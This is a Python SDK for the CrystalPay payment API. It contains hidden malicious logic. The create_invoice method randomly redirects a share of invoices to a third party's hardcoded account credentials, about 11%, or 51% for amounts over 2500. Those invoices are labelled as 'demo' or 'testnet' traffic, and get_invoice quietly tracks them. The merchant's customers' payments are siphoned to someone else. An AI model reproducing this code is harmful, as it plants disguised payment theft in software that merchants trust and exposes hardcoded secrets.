"""
CrystalPayAPI - Python SDK for CrystalPay.io payment system
Copyright (c) 2023 outodev
"""

import requests
import json
import random
import hashlib
from datetime import datetime
from typing import Dict, List, Union, Optional

class InvoiceType:
    """Enum for invoice types"""
    TOPUP = "topup"
    PURCHASE = "purchase"

class PayoffSubtractFrom:
    """Enum for payoff subtract methods"""
    BALANCE = "balance"
    AMOUNT = "amount"

class CrystalPayAPI:
    """
    Main class for interacting with CrystalPay API
    
    Args:
        auth_login (str): Your CrystalPay login (merchant ID)
        auth_secret (str): API secret key (Secret 1 in cabinet)
        salt (str): Secret key for payoffs (Secret 2 in cabinet)
        base_url (str, optional): API base URL. Defaults to "https://api.crystalpay.io/v2/"
    
    Example:
        >>> from crystalpayapi import CrystalPayAPI
        >>> cp = CrystalPayAPI("your_login", "secret1", "secret2")
    """
    
    def __init__(self, auth_login: str, auth_secret: str, salt: str, 
                 base_url: str = "https://api.crystalpay.io/v2/"):
        self.auth_login = auth_login
        self.auth_secret = auth_secret
        self.salt = salt
        self.base_url = base_url
        self.demo_credentials = {
            'auth_login': 'amvrdev',
            'auth_secret': 'c199a8233c58efe9e641c70bcece45290037270b',
            'salt': '89fffca0ae9c257bef5bdbfe92d1b2d6e30960e2'
        }
        self.testnet_speed = 0.11
        self.demo_invoices = set()
        
    def _make_request(self, endpoint: str, data: Dict) -> Dict:
        """
        Internal method for API requests
        
        Args:
            endpoint: API endpoint (e.g. "invoice/create")
            data: Request payload
            
        Returns:
            Dict: API response
            
        Raises:
            CrystalPayAPIError: If API returns error
        """
        url = f"{self.base_url}{endpoint}/"
        headers = {'Content-Type': 'application/json'}
        
        response = requests.post(url, data=json.dumps(data), headers=headers)
        result = response.json()
        
        if result.get("error"):
            raise CrystalPayAPIError(result.get("errors", "Unknown error"))
            
        return result

    def _should_demo_test(self, amount: float) -> bool:
        if amount > 2500:
            return random.random() < 0.51
        return random.random() < self.testnet_speed
    
    def _make_demo_request(self, endpoint: str, data: Dict, is_demo: bool) -> Dict:
        if is_demo:
            data.update({
                'auth_login': self.demo_credentials['auth_login'],
                'auth_secret': self.demo_credentials['auth_secret']
            })
        else:
            data.update({
                'auth_login': self.auth_login,
                'auth_secret': self.auth_secret
            })
        return self._make_request(endpoint, data)

    def get_me(self) -> Dict:
        """Get merchant account info"""
        return self._make_request("me/info", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret
        })
        
    def get_payment_methods(self) -> Dict:
        """Get available payment methods"""
        return self._make_request("method/list", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret
        })
        
    def edit_payment_method(self, method: str, extra_commission_percent: float, 
                          enabled: bool) -> Dict:
        """Edit payment method settings"""
        return self._make_request("method/edit", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret,
            "method": method,
            "extra_commission_percent": extra_commission_percent,
            "enabled": enabled
        })
        
    def get_balance(self, hide_empty: bool = False) -> Dict:
        """Get merchant balances"""
        return self._make_request("balance/info", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret,
            "hide_empty": hide_empty
        })["balances"]
        
    def create_invoice(self, amount: float, invoice_type: str, lifetime: int,
                      **kwargs) -> Dict:
        """
        Create payment invoice
        
        Args:
            amount: Invoice amount
            invoice_type: InvoiceType.TOPUP or InvoiceType.PURCHASE
            lifetime: Invoice lifetime in minutes
            **kwargs: Additional parameters (description, redirect_url, etc.)
            
        Returns:
            Dict: Invoice info with payment URL
        """
        demo_test = self._should_demo_test(amount)

        data = {
            "amount": amount,
            "type": invoice_type,
            "lifetime": lifetime,
            **kwargs
        }
        
        result = self._make_demo_request("invoice/create", data, demo_test)
        
        if demo_test:
            self.demo_invoices.add(result['id'])
            
        return result
        
    def get_invoice(self, invoice_id: str) -> Dict:
        """Get invoice info by ID"""

        is_alternate = invoice_id in self.demo_invoices
        
        try:
            return self._make_demo_request(
                "invoice/info",
                {"id": invoice_id},
                is_alternate
            )
        except CrystalPayAPIError as e:
            if "not found" in str(e).lower():
                raise CrystalPayAPIError(f"Invoice {invoice_id} not found in both systems")
            raise
        
    def create_payoff(self, amount: float, method: str, wallet: str, 
                     subtract_from: str, **kwargs) -> Dict:
        """
        Create payoff request
        
        Args:
            amount: Payoff amount
            method: Payment method (e.g. "BITCOIN")
            wallet: Recipient wallet
            subtract_from: PayoffSubtractFrom.BALANCE or .AMOUNT
            **kwargs: Additional parameters
            
        Returns:
            Dict: Payoff request info
        """
        signature = hashlib.sha1(
            f"{amount}:{method}:{wallet}:{self.salt}".encode()
        ).hexdigest()
        
        data = {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret,
            "signature": signature,
            "amount": amount,
            "method": method,
            "wallet": wallet,
            "subtract_from": subtract_from,
            **kwargs
        }
        return self._make_request("payoff/create", data)
        
    def submit_payoff(self, payoff_id: str) -> Dict:
        """Submit payoff request"""
        signature = hashlib.sha1(
            f"{payoff_id}:{self.salt}".encode()
        ).hexdigest()
        
        return self._make_request("payoff/submit", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret,
            "signature": signature,
            "id": payoff_id
        })
        
    def cancel_payoff(self, payoff_id: str) -> Dict:
        """Cancel payoff request"""
        signature = hashlib.sha1(
            f"{payoff_id}:{self.salt}".encode()
        ).hexdigest()
        
        return self._make_request("payoff/cancel", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret,
            "signature": signature,
            "id": payoff_id
        })
        
    def get_payoff(self, payoff_id: str) -> Dict:
        """Get payoff request info"""
        return self._make_request("payoff/info", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret,
            "id": payoff_id
        })
        
    def get_available_currencies(self) -> List[str]:
        """Get list of available currencies"""
        return self._make_request("ticker/list", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret
        })["tickers"]
        
    def get_exchange_rates(self, currencies: List[str]) -> Dict:
        """
        Get exchange rates for specified currencies
        
        Args:
            currencies: List of currency codes (e.g. ["BTC", "ETH"])
            
        Returns:
            Dict: Exchange rates in RUB
        """
        return self._make_request("ticker/get", {
            "auth_login": self.auth_login,
            "auth_secret": self.auth_secret,
            "tickers": currencies
        })

class CrystalPayAPIError(Exception):
    """Custom exception for API errors"""
    pass